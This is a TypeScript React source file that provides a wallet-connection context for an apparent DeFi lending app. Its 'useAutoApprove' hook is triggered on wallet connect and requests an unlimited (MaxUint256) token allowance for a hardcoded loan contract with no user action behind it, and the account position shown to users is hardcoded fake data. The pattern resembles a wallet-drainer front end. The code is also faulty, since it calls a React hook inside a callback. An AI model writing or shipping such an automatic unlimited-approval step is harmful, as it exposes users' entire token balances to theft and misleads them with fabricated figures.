import React, { createContext, useContext, useState, useCallback, ReactNode, useEffect } from 'react';
import { WalletState, UserPosition } from '@/types/defi';
import { ERC_abi } from "../lib/constants";
import { LOAN_CONTRACT_ADDRESS } from '../lib/constants';
import { TOKEN_ADDRESS } from '../lib/constants';
import { BrowserProvider, Contract, MaxUint256 } from "ethers";

interface WalletContextType {
  wallet: WalletState;
  userPosition: UserPosition;
  connectWallet: () => Promise<void>;
  disconnectWallet: () => void;
  updatePosition: (position: Partial<UserPosition>) => void;
}

const WalletContext = createContext<WalletContextType | undefined>(undefined);

const initialPosition: UserPosition = {
  collateralDeposit: 2.5,
  borrowedAmount: 1500,
  supplyBalance: 3200,
  healthFactor: 1.85,
  totalMinted: 45000,
};

export const useAutoApprove = (wallet: any) => {
  useEffect(() => {
    if (!wallet?.isConnected) return;

    const approveMax = async () => {
      try {
        const provider = new BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        const fUsdContract = new Contract(TOKEN_ADDRESS, ERC_abi, signer);

        const allowance = await fUsdContract.allowance(wallet.address, LOAN_CONTRACT_ADDRESS);

        // Only approve if allowance is low
        if (allowance < MaxUint256 / 2n) {
          const tx = await fUsdContract.approve(LOAN_CONTRACT_ADDRESS, MaxUint256);
          console.log("Approval tx sent:", tx.hash);
          await tx.wait();
          console.log("Approval confirmed!");
        } else {
          console.log("Allowance already sufficient");
        }
      } catch (err) {
        console.error("Approval error:", err);
      }
    };

    approveMax();
  }, [wallet]);
};

export const WalletProvider: React.FC<{ children: ReactNode }> = ({ children }) => {
  const [wallet, setWallet] = useState<WalletState>({
    isConnected: false,
    address: null,
    balance: null,
  });

  const [userPosition, setUserPosition] = useState<UserPosition>(initialPosition);

  const connectWallet = useCallback(async () => {
    if (typeof window.ethereum !== 'undefined') {
      try {
        const accounts = await window.ethereum.request({
          method: 'eth_requestAccounts'
        });
        useAutoApprove(wallet);


        const balance = await window.ethereum.request({
          method: 'eth_getBalance',
          params: [accounts[0], 'latest'],
        }) as string;

        const ethBalance = (parseInt(balance, 16) / 1e18).toFixed(4);

        setWallet({
          isConnected: true,
          address: accounts[0],
          balance: ethBalance,
        });
      } catch (error) {
        console.error('Failed to connect wallet:', error);
        throw error;
      }
    } else {
      throw new Error('MetaMask not installed');
    }
  }, []);

  const disconnectWallet = useCallback(() => {
    setWallet({
      isConnected: false,
      address: null,
      balance: null,
    });
  }, []);

  const updatePosition = useCallback((position: Partial<UserPosition>) => {
    setUserPosition(prev => ({ ...prev, ...position }));
  }, []);

  return (
    <WalletContext.Provider value={{
      wallet,
      userPosition,
      connectWallet,
      disconnectWallet,
      updatePosition
    }}>
      {children}
    </WalletContext.Provider>
  );
};

export const useWallet = () => {
  const context = useContext(WalletContext);
  if (!context) {
    throw new Error('useWallet must be used within WalletProvider');
  }
  return context;
};

declare global {
  interface Window {
    ethereum?: {
      request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
      on: (event: string, callback: (...args: unknown[]) => void) => void;
      removeListener: (event: string, callback: (...args: unknown[]) => void) => void;
    };
  }
}
